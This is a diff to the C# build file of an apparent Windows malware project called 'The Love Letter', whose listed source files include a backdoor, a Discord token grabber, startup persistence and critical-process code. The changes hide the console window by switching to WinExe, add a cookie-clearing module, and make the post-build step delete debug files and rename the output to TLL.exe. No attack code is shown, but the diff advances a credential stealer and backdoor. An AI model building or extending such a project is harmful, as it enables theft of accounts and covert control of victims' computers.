@@ -6,7 +6,7 @@
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
     <ProjectGuid>{455E37BF-B767-4323-B8F5-A86CEECD3D91}</ProjectGuid>
-    <OutputType>Exe</OutputType>
+    <OutputType>WinExe</OutputType>
     <RootNamespace>Client</RootNamespace>
     <AssemblyName>The Love Letter</AssemblyName>
     <TargetFrameworkVersion>v4.6</TargetFrameworkVersion>
@@ -119,6 +119,7 @@
   <ItemGroup>
     <Compile Include="Armitage\Backdoor.cs" />
     <Compile Include="Armitage\Compiler.cs" />
+    <Compile Include="Armitage\CookieClearer.cs" />
     <Compile Include="Armitage\Cookies\DiscordToken.cs" />
     <Compile Include="Armitage\Critical Process.cs" />
     <Compile Include="Armitage\Startup.cs" />
@@ -173,6 +174,7 @@
   </Target>
   <Import Project="..\packages\Costura.Fody.5.4.0-alpha0042\build\Costura.Fody.targets" Condition="Exists('..\packages\Costura.Fody.5.4.0-alpha0042\build\Costura.Fody.targets')" />
   <PropertyGroup>
-    <PostBuildEvent>del "$(TargetDir)*.xml", "$(TargetDir)*.pdb", "$(TargetDir)*.config"</PostBuildEvent>
+    <PostBuildEvent>del "$(TargetDir)*.xml", "$(TargetDir)*.pdb", "$(TargetDir)*.config"
+move "The Love Letter.exe" "TLL.exe"</PostBuildEvent>
   </PropertyGroup>
 </Project>
